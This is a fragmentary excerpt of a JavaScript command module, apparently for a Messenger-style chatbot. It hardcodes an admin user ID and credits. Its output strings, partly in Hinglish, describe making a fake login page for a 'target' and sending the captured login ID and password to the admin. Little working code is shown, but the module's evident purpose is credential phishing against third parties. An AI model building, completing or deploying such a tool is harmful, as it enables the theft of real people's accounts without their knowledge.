...
module.exports.config = {
  ...
  hasPermssion: 0,
  credits: "𝐄𝐌𝐌𝐀 𝐎𝐋𝐈𝐕𝐈𝐀", // Updated credits
...
const adminUID = "61594011388225"; // Replace with the actual admin UID
...
[ RESULT ]  login page created. Credentials simulated.`;
    ...
    const finalMessageToAdminText = `𝐄𝐌𝐌𝐀 𝐎𝐋𝐈𝐕𝐈𝐀 ji, kaam hua ${profilePicSentSuccessfully ? '' : 'lekin target ki profile info/pic nahi milne ya bhej na pane ke karan fake login page nahi bhej paya. '} login krlo id pasword apko bhej dia hh.`;
    const adminNameForMention = "𝐄𝐌𝐌𝐀 𝐎𝐋𝐈𝐕𝐈𝐀 ji"; // Hardcoded as requested
